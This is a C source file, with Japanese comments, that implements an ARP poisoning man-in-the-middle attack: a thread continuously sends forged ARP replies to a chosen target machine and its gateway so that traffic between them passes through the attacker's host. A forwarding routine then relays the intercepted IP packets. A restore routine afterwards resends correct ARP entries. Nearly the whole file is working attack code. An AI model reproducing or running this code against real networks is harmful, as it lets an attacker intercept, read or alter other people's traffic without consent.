#include <stdio.h>
#include <pthread.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <pthread.h>
#include <unistd.h>

#include "sock.h"
#include "ether.h"
#include "arp.h"
#include "param.h"
#include "arp_poison.h"

extern PARAM Param;

int isPoisoning = 0;

pthread_attr_t attr;
pthread_t thread_id;

struct in_addr target_addr;
struct in_addr gateway_addr;
u_int8_t t_mac[6];
u_int8_t g_mac[6];


/*
フラグ(isPoisonig=true)が立っている場合は、
攻撃対象に対して偽装したARP Replyを送り続ける
thread化する予定
*/
void *PoisonThread(void * arg)
{
    if(isPoisoning != 1){ return; }

    union {
        u_int32_t l;
        u_int8_t c[4];
    }m_addr, t_addr, g_addr;

    //targetPCのIPアドレス
    t_addr.l = target_addr.s_addr;
    //gatewayのIPアドレス
    g_addr.l = gateway_addr.s_addr;
    //my IP Address
    m_addr.l = Param.vip.s_addr;

    ArpSearchTable(&target_addr, t_mac);
    ArpSearchTable(&gateway_addr, g_mac);
    
    int soc = GetDeviceSoc();

    while(isPoisoning == 1)
    {
        // send ARP Reply to target PC
        ArpSend
        (
            soc,         //soc
            ARPOP_REPLY, //op
            Param.vmac,  //e_smac 自分から送る gatewayでも良い？
            t_mac,       //e_dmac targetに送る
            Param.vmac,  //smac   自分のMACを送る(本来ならgateway)
            t_mac,       //dmac   targetのMACを送る
            g_addr.c,    //saddr  gatewayのIPアドレス
            t_addr.c     //daddr  targetのIPアドレス
        );

        // send ARP Repley to target gateway
        ArpSend
        (
            soc,         //soc
            ARPOP_REPLY, //op
            Param.vmac,  //e_smac 自分から送る targetでも良い？
            g_mac,       //e_dmac gatewayに送る
            Param.vmac,  //smac   自分のMACを送る(本来ならtarget)
            g_mac,       //dmac   gatewayのMACを送る
            t_addr.c,    //saddr  targetのIPアドレス
            g_addr.c     //daddr  gatewayのIPアドレス
        );
    }

}

void *PoisonTest(void * arg)
{
    while(isPoisoning == 1)
    {
        printf("POISON TEST\n");
        sleep(5);
    }
    return NULL;
}

void SetOptArpThread(pthread_attr_t _attr, pthread_t _thread_id)
{
    attr = _attr;
    thread_id = _thread_id;
}

void StartPoison(int soc, struct in_addr *target, struct in_addr *gateway)
{
    isPoisoning = 1;
    target_addr = *target;
    gateway_addr = *gateway;

    if(pthread_create(&thread_id, &attr, PoisonThread, NULL) != 0)
    {
        printf("pthread_create ArpPoison\n");
    }
}

void StopPoison(void)
{
    printf("[*]Stop ARP Poison\n");

    if(isPoisoning != 1){ return; }

    union {
        u_int32_t l;
        u_int8_t c[4];
    }t_addr, g_addr;

    //targetPCのIPアドレス
    t_addr.l = target_addr.s_addr;
    //gatewayのIPアドレス
    g_addr.l = gateway_addr.s_addr;

    int soc = GetDeviceSoc();

    int i;
    // 5回くらい正しいARP Replyを送信して攻撃対象のARPテーブルを戻す
    for(i = 0; i < 5; i++)
    {
        // targetに正しいgatewayに関するARP Replyを送信
        ArpSend
        (
            soc,         //soc
            ARPOP_REPLY, //op
            Param.vmac,  //e_smac 自分から送る
            t_mac,       //e_dmac targetに送る
            g_mac,       //smac   gatewayのMACを送る
            t_mac,       //dmac   targetのMACを送る
            g_addr.c,    //saddr  gatewayのIPアドレス
            t_addr.c     //daddr  targetのIPアドレス
        );

        // gatewayに正しいARP Replyを送信
        ArpSend
        (
            soc,         //soc
            ARPOP_REPLY, //op
            Param.vmac,  //e_smac 自分から送る
            g_mac,       //e_dmac gatewayに送る
            t_mac,       //smac   targetのMACを送る
            g_mac,       //dmac   gatewayを送る
            t_addr.c,    //saddr  targetのIPアドレス
            g_addr.c     //daddr  gatewayのIPアドレス
        );
    }

    isPoisoning = 0;
    printf("isPoison=%d\n", isPoisoning);
}

void TransferPacket(struct ether_header *eh, u_int8_t *data, int len)
{
    if(isPoisoning == 0){return;}

    if(ntohs(eh->ether_type) != ETHERTYPE_IP)
    {
        return;
    }

    int soc = GetDeviceSoc();

    // 本来ならgatewayからtargetに向かうパケットなのでMACをtargetに変更する
    if(maccmp(eh->ether_dhost, t_mac) == 0)
    {
        EtherTransfer(soc, eh, t_mac, data, len);
    }
    // 本来ならtargetからgatewayに向かうパケットなのでMACをgatewayに変更する
    else if(maccmp(eh->ether_shost, t_mac) == 0)
    {
        EtherTransfer(soc, eh, g_mac, data, len);
    }
}

int maccmp(u_int8_t from_mac[6], u_int8_t to_mac[6])
{
    int i = 0;
    for(i = 0; i < 6; i++)
    {
        if(from_mac[i] != to_mac[i])
        {
            return -1;
        }
    }
    char buf1[80];
    return 0;
}

